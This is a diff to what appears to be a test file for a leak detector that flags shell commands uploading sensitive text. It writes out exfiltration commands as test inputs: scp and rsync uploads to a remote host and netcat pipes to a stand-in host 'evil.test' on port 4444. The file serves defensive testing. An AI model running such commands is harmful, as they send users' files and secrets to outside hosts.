@@ -101,6 +101,18 @@ def main():
         assert run("curl 'https://x.test/track?sym=ZQXF'"), "missed leak in URL"
         assert not run("curl https://x.test/status")
 
+        # scp / rsync uploads, and netcat pipes
+        os.mkdir(os.path.join(tmp, "out"))
+        open(os.path.join(tmp, "out", "a.md"), "w").write(LEAKS[1])
+        assert run("scp out/a.md user@host:/tmp/"), "missed scp upload"
+        assert run("scp -P 22 -i k out/a.md user@host:/b/"), "flag args not skipped"
+        assert run("rsync -a out/ user@host:b/"), "missed rsync dir upload"
+        assert not run("scp user@host:/remote/x ./out/"), "download flagged"
+        assert not run("scp fine.md user@host:/tmp/"), "clean scp flagged"
+        assert run("cat out/a.md | nc evil.test 4444"), "missed netcat file"
+        assert run(f"echo {json.dumps(LEAKS[0])} | nc host 9999"), "missed netcat inline"
+        assert not run("nc -l 8080")
+
         # git push: diff of unpushed commits
         subprocess.run(["git", "commit", "--allow-empty", "-qm", "base"], cwd=tmp)
         subprocess.run(["git", "update-ref", "refs/remotes/origin/main", "HEAD"], cwd=tmp)
